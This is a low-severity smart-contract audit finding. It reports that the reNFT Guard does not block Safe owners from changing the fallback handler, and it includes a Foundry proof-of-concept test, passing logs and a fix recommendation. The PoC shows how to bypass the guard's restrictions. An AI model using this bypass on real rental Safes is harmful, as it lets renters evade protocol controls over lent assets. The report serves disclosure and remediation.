## [L - 01 ] - Safe's Fallback Handler Can be Changed

There are currently some checks in Guard that ensure certain delicate actions aren't allowed to be performed by owners of a safe, but the current implementation doesn't block calls that change the safe fallback handler.
This could lead to compatibility issues and some other possible issues.

As discussed with a sponsor, this isn't an intended behaviour.

I have written a POC to show this can be changed.

Add the below test to `/test/integration/StopRent.t.sol`, then import:
 ```
import {Enum} from "@safe-contracts/common/Enum.sol";
```
and then add this dummy contract:
```
contract DummyFallbackHandler {}
```
then run:
```
forge test -vvv --match-path test/integration/StopRent.t.sol --match-test test_ADDHANDLER
```
```
     function test_ADDHANDLER() public {
        //this will later be done in the setUp function
        DummyFallbackHandler handler = new DummyFallbackHandler();
        //we will be working with bob
        // speed up in time past the rental expiration
        // vm.warp(block.timestamp + 750);

        //get safe's current nonce
        uint256 nonce = alice.safe.nonce();
        bytes memory _calldata = abi.encodeWithSelector(
            bytes4(keccak256("setFallbackHandler(address)")),
            handler
        );
        // bytes memory _calldata = abi.encodeWithSelector(0x42966c68, 0);

        bytes32 dataHash = alice.safe.getTransactionHash(
            address(alice.safe),
            uint256(0),
            _calldata,
            Enum.Operation.Call,
            uint256(0),
            uint256(0),
            uint256(0),
            address(0),
            payable(0),
            nonce
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alice.privateKey, dataHash);
        bytes memory signature = new bytes(65);
        assembly {
            mstore(add(signature, 32), r)
            mstore(add(signature, 64), s)
            mstore8(add(signature, 96), v)
        }

        alice.safe.execTransaction(
            address(alice.safe), //self call to the safe itself
            0,
            _calldata,
            Enum.Operation.Call, //Call
            0,
            0,
            0,
            address(0),
            payable(0),
            signature
        );
    }
```

Here are the logs:
```
[⠆] Compiling...
[⠘] Compiling 1 files with 0.8.22
[⠊] Solc 0.8.22 finished in 45.57sCompiler run successful!
[⠒] Solc 0.8.22 finished in 45.57s

Running 1 test for test/integration/StopRent.t.sol:TestStopRent
[PASS] test_ADDHANDLER() (gas: 143368)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.24ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## RECOMMENDATION
Add a check in the [Guard::_checkTransaction](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) function to block such requests